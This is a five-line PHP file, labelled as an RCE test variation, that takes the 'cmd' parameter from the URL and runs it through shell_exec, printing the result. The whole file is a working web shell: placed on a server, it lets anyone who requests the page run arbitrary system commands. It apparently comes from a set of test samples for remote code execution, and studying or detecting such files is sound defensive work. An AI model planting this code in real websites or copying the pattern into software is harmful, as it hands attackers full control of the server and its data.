<?php
// RCE test variation #465
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>